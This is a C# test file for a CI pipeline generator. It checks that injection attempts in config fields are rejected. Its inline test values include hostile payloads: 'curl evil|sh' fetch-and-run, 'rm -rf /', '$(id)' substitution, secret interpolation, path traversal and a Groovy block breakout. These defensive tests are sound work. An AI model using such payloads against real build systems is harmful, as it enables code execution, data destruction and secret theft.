using PipelineForge.Core.Generation;
using PipelineForge.Core.Model;
using PipelineForge.Core.Validation;

namespace PipelineForge.Tests.Generation;

public class InjectionTests
{
    [Theory]
    [InlineData("main'; sh 'curl evil|sh'; '")]
    [InlineData("main\" + System.exit(0) + \"")]
    [InlineData("feature/${env.SECRET}")]
    [InlineData("../../etc")]
    [InlineData("main\nstage")]
    public void Malicious_branch_patterns_are_rejected(string branch)
    {
        var config = Samples.MavenHelm();
        config.Environments[0].BranchPattern = branch;
        var result = PipelineGenerator.Generate(config);
        Assert.False(result.Success);
        Assert.Contains(result.Errors, e => e.Path == "environments[0].branchPattern");
        Assert.Empty(result.Files);
    }

    [Theory]
    [InlineData("https://x.example.com/'; rm -rf /")]
    [InlineData("https://user:pass@x.example.com")]
    [InlineData("javascript:alert(1)")]
    [InlineData("https://x.example.com/$(id)")]
    public void Malicious_urls_are_rejected(string url)
    {
        var config = Samples.MavenHelm();
        config.Environments[1].Url = url;
        Assert.Contains(PipelineGenerator.Generate(config).Errors, e => e.Path == "environments[1].url");
    }

    [Theory]
    [InlineData("modules[0].path", "../outside")]
    [InlineData("modules[0].path", "/etc")]
    [InlineData("modules[0].name", "API; rm")]
    [InlineData("registry.credentialId", "cred id")]
    [InlineData("quality.serverName", "x') { evil() } withSonarQubeEnv('y")]
    public void Malicious_values_are_rejected(string path, string value)
    {
        var config = Samples.MavenHelm();
        switch (path)
        {
            case "modules[0].path": config.Modules[0].Path = value; break;
            case "modules[0].name": config.Modules[0].Name = value; break;
            case "registry.credentialId": config.Registry!.CredentialId = value; break;
            case "quality.serverName": config.Quality.ServerName = value; break;
        }
        Assert.Contains(PipelineGenerator.Generate(config).Errors, e => e.Path == path);
    }

    [Theory]
    [InlineData("echo 'hi' }\n}\npost { always { sh 'evil' } }\nstage('x') {")]
    [InlineData("echo 'unterminated")]
    [InlineData("}")]
    public void Custom_stages_cannot_break_out_of_their_block(string steps)
    {
        var config = Samples.MavenHelm();
        config.CustomStages.Add(new CustomStage { Name = "Custom", Steps = steps });
        Assert.Contains(PipelineGenerator.Generate(config).Errors, e => e.Path == "customStages[0].steps");
    }

    [Fact]
    public void Braces_inside_strings_and_comments_are_ignored()
    {
        Assert.True(ConfigValidator.BracesBalanced("echo '}' // }\n/* { */ sh \"\"\"\n}\n\"\"\""));
    }

    [Theory]
    [InlineData("it's", @"'it\'s'")]
    [InlineData(@"a\b", @"'a\\b'")]
    [InlineData("${x}", "'${x}'")]
    [InlineData("a\nb", @"'a\nb'")]
    public void Groovy_quoting_escapes_quotes_and_backslashes(string input, string expected) =>
        Assert.Equal(expected, GroovyEscaper.Quote(input));
}
